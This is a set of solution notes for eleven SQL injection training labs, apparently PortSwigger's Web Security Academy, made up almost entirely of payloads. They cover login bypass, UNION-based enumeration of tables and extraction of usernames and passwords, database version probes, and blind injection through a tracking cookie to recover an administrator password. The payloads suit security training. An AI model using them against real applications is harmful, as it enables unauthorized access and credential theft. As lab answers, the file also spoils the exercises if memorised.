# SQL injection


 * [sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)


### Lab1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

>**Q. SELECT * FROM products WHERE category = 'Gifts' AND released = 1 **

```sh
'+OR+1=1--
```

### Lab2: SQL injection vulnerability allowing login bypass
>**Q. To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user. **

```sh
administrator'--
```
### Lab3: SQL injection attack, querying the database type and version on Oracle

```sh
'+UNION+SELECT+'abc','def'+FROM+dual--
```
```sh
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

### Lab4: SQL injection attack, querying the database type and version on MySQL and Microsoft

  ```sh
  order by 2#
  ```

  ```sh
  union select 1,2#
  ```

  ```sh
  union select 1,@@version#
  ```
### Lab5: SQL injection attack, listing the database contents on non-Oracle databases

  ```sh
  order by 2--
  ```
  ```sh
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
  ```
  ```sh
'+UNION+SELECT+column_name,table_name+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
  ```
  ```sh
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
  ```
### Lab6: SQL injection attack, listing the database contents on Oracle
```sh
order by 2--
```
```sh
'+UNION+SELECT+null,null+FROM+dual--
```
```sh
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```
```sh
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
```
```sh
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
```
### Lab7: SQL injection UNION attack, determining the number of columns returned by the query
```sh
order by 3--
```
```sh
'union select null,null,null--
```
### Lab8: SQL injection UNION attack, finding a column containing text
```sh
'+UNION+SELECT+NULL,'a',NULL--
```
```sh
'+UNION+SELECT+NULL,'273Yf9bW',NULL--
```
### Lab9: SQL injection UNION attack, retrieving data from other tables
```sh
'+UNION+SELECT+null,null--
```
```sh
'+UNION+SELECT+null,table_name+from+information_schema.tables--
```
```sh
'+UNION+SELECT+column_name,table_name+from+information_schema.columns+where+table_name='users'--
```
```sh
'+UNION+SELECT+user,password+from+user--
```
### Lab10: SQL injection UNION attack, retrieving multiple values in a single column
```sh
'+UNION+SELECT+NULL,'a'--
```
```sh
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```
Or

```sh
'+UNION+SELECT+NULL,username||password+FROM+users--
```

### Lab11: Blind SQL injection with conditional responses
```sh
TrackingId=xyz' AND '1'='1
```
```sh
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```
```sh
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```
```sh
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```
```sh    
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

















